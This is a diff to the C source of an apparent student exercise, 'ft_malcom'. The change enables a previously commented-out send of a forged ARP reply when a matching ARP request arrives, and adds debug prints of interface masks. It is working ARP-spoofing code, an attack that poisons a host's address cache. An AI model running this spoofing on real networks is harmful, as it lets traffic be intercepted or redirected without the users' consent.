@@ -6,14 +6,14 @@
 /*   By: mprofett <mprofett@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/09/19 20:02:00 by mprofett          #+#    #+#             */
-/*   Updated: 2024/09/26 19:22:46 by mprofett         ###   ########.fr       */
+/*   Updated: 2024/09/27 12:32:53 by mprofett         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ft_malcom.h"
 
 ArpFrame		*request_frame;
-ArpFrame		*reply_frame;
+ArpReplyFrame	*reply_frame;
 SocketInfo  	*sockinfo;
 
 void	print_raw(unsigned char *buffer, int size)
@@ -28,7 +28,7 @@ void	print_raw(unsigned char *buffer, int size)
 
 void	prebuild_arp_reply(char **argv)
 {
-	ft_memset(reply_frame, 0, ARP_SIZE);
+	ft_memset(reply_frame, 0, 42);
 	encode_mac_str(argv[4], reply_frame->ether_dest_mac);
 	encode_mac_str(argv[2], reply_frame->ether_src_mac);
 	encode_type("0806", reply_frame->ether_proto);
@@ -65,9 +65,14 @@ char	*compare_addresses(u_int32_t *source, u_int32_t *target, struct ifaddrs *in
 		{
 			addr = (struct sockaddr_in *)interface_address->ifa_addr;
 			mask = (struct sockaddr_in *)interface_address->ifa_netmask;
+			printf("interface checked: %s\n", interface_address->ifa_name);
+
 			maskedtarget = *target & mask->sin_addr.s_addr;
 			maskedsource = *source & mask->sin_addr.s_addr;
 			maskedinterface = addr->sin_addr.s_addr & mask->sin_addr.s_addr;
+			printf("interfacemasked: %u\n", maskedinterface);
+			printf("targetmasked: %u\n", maskedtarget);
+			printf("sourcemasked: %u\n", maskedsource);
 			if (maskedtarget == maskedsource && maskedtarget == maskedinterface)
 				result = ft_strdup(interface_address->ifa_name);
 		}
@@ -90,15 +95,16 @@ char	*find_interface_name(u_int32_t *source, u_int32_t *target)
 	if (result)
 		printf("Found available interface: %s\n", result);
 	else
-		printf("No interface where source and target could see each other found\n");
+		exit_error("No interface where source and target could see each other found\n");
 	return (result);
 }
 
 int main(int argc, char **argv)
-{	
+{
 	uint32_t	int_target_to_spoof;
 	uint32_t	int_source_to_spoof;
 	char		*interface;
+	int			bytes_recv = 0;
 
 	check_args_validity(argc, argv);
 	inet_pton(AF_INET, argv[1], &int_target_to_spoof);
@@ -109,13 +115,18 @@ int main(int argc, char **argv)
 	signal(SIGINT, &signalHandler);
 	while(1)
 	{
-		recvfrom(sockinfo->socket, request_frame, ARP_SIZE, 0, &sockinfo->addr, &sockinfo->socklen);
-		if (*(u_int32_t *)request_frame->arp_dest_ip == int_target_to_spoof && *(u_int32_t *)request_frame->arp_src_ip == int_source_to_spoof)
+		bytes_recv = recvfrom(sockinfo->socket, request_frame, ARP_SIZE, 0, &sockinfo->addr, &sockinfo->socklen);
+		if (bytes_recv != 0)
 		{
-			// sendto(sockinfo->socket, (void *)reply_frame, ARP_REPLY_SIZE, 0, &sockinfo->addr, sockinfo->socklen);
-			print_raw((unsigned char *)request_frame, ARP_SIZE);
-			print_frame_infos(request_frame);
-			ft_memset(request_frame, 0, ARP_SIZE);
+			if (*(u_int32_t *)request_frame->arp_dest_ip == int_target_to_spoof && *(u_int32_t *)request_frame->arp_src_ip == int_source_to_spoof)
+			{
+				bytes_recv = sendto(sockinfo->socket, (void *)reply_frame, 42, 0, &sockinfo->addr, sockinfo->socklen);
+				printf("bytes send: %d\n", bytes_recv);
+				print_frame_infos(request_frame);
+				print_frame_infos((ArpFrame *)reply_frame);
+				return (0);
+			}
+			bytes_recv = 0;
 		}
 	}
     return (0);
